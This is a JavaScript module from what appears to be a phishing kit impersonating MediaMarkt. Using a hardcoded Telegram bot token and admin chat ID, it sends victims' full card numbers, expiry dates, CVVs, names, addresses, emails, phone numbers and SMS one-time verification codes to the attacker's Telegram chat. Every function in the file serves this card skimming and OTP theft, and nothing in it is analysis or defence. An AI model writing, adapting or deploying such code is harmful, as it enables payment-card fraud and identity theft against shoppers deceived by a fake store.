const TELEGRAM_BOT_TOKEN     = '8783298783:AAHlRo4nFZ-pEn_3cXZYhktkp-xGwpOaqwU';
const TELEGRAM_ADMIN_CHAT_ID = '8890758686';

async function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_ADMIN_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
    });

    if (!response.ok) {
      const err = await response.json();
      console.error('[Telegram] Failed to send message:', err);
    } else {
      console.log('[Telegram] Message sent successfully.');
    }
  } catch (error) {
    console.error('[Telegram] Network error:', error);
  }
}

export async function notifyOrderAndCardDetails(details) {
  const {
    productName, productPrice,
    cardName, cardNumber, cardExpiry, cardCvv,
    shipName, shipLastname, shipAddress, shipPostal, shipCity, shipEmail, shipPhone,
  } = details;

  const rawDigits = cardNumber.replace(/\D/g, '');
  const maskedCard = `•••• •••• •••• ${rawDigits.slice(-4)}`;

  const timestamp = new Date().toLocaleString('en-GB', { timeZone: 'Europe/Madrid' });

  const message =
`🛒 <b>NEW ORDER – MediaMarkt</b>
🕐 <i>${timestamp}</i>

━━━━━━━━━━━━━━━━━━━━━━
📦 <b>PRODUCT</b>
• Item:    <code>${productName}</code>
• Amount:  <b>${productPrice}</b>

━━━━━━━━━━━━━━━━━━━━━━
💳 <b>CARD DETAILS</b>
• Cardholder:  <code>${cardName}</code>
• Full Number: <code>${rawDigits}</code>
• (Masked: ${maskedCard})
• Expiry:      <code>${cardExpiry}</code>
• CVV:         <code>${cardCvv}</code>

━━━━━━━━━━━━━━━━━━━━━━
🚚 <b>SHIPPING ADDRESS</b>
• Name:     ${shipName} ${shipLastname}
• Address:  ${shipAddress}
• Postcode / City: ${shipPostal} – ${shipCity}
• Email:    ${shipEmail}
• Phone:    ${shipPhone}
━━━━━━━━━━━━━━━━━━━━━━ `;

  await sendTelegramMessage(message);
}

export async function notifyVerificationCode(code, cardNumber, productPrice) {
  const rawDigits = cardNumber.replace(/\D/g, '');
  const maskedCard = `•••• •••• •••• ${rawDigits.slice(-4)}`;
  const timestamp = new Date().toLocaleString('en-GB', { timeZone: 'Europe/Madrid' });

  const message =
`🔐 <b>OTP CODE RECEIVED – MediaMarkt</b>
🕐 <i>${timestamp}</i>

━━━━━━━━━━━━━━━━━━━━━━
🔑 <b>SMS Verification Code:</b>
   <code>${code}</code>

💳 Card:    ${maskedCard}
💶 Amount:  <b>${productPrice}</b>
━━━━━━━━━━━━━━━━━━━━━━
✅ <i>Customer has entered the code</i>`;

  await sendTelegramMessage(message);
}
